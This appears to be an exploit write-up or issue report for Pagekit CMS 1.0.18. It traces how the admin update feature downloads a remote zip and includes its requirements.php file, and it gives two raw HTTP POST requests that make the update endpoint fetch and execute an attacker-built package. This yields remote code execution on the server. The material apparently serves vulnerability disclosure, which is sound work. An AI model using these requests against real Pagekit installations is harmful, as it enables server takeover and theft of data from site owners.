# PageKIt_Exp
PageKIt_Exp文件
<!--

Before submitting an issue, please try some troubleshooting steps:

- Enabled debug mode: https://pagekit.com/docs/troubleshooting/debug-mode
- Verify the server requirements: https://pagekit.com/docs/getting-started/requirements
- Disable all installed extensions
- Check the browser developer console for errors

-->

## Problem

**There is a logical flaw that leads to obtaining shell access.**
  

## Technical Details

- Pagekit version: 1.0.18
- Webserver: nginx
- Database: mysql
- PHP Version: 7.4

Vulnerability Path:
app/installer/src/Controller/UpdateController.php
Lines 32-72: downloadAction and updateAction functions
The downloadAction function retrieves a file from a remote location to the local system.
The updateAction function reads the downloaded file.
Within it, the SelfUpdater function is called at app/installer/src/SelfUpdater.php.
It includes the app/installer/requirements.php file from the remotely fetched file.
This can lead to remote code execution.
Based on this, constructing a zip file as follows:
[pagekit.zip](https://github.com/pagekit/pagekit/files/12388705/pagekit.zip)


The data package is as follows
#### 
    POST /index.php/admin/system/update/download HTTP/1.1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Connection: keep-alive
    Content-Length: 58
    Content-Type: application/x-www-form-urlencoded
    Cookie: Administrator's Cookie
    Host: localhost
    Referer: http://localhost/index.php/admin/system/update/download
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
    
    url=constructed_zip_file&_csrf=4eb8d50f82ebae5b1fa16d5177d99ea7d740a8b2


####
    POST /index.php/admin/system/update/update HTTP/1.1
    Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
    Accept-Encoding: gzip, deflate
    Accept-Language: zh-CN,zh;q=0.9
    Cache-Control: max-age=0
    Connection: keep-alive
    Content-Length: 46
    Content-Type: application/x-www-form-urlencoded
    Cookie: Administrator's Cookie
    Host: localhost
    Referer: http://localhost /index.php/admin/system/update/update
    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36
    
    _csrf=4eb8d50f82ebae5b1fa16d5177d99ea7d740a8b2


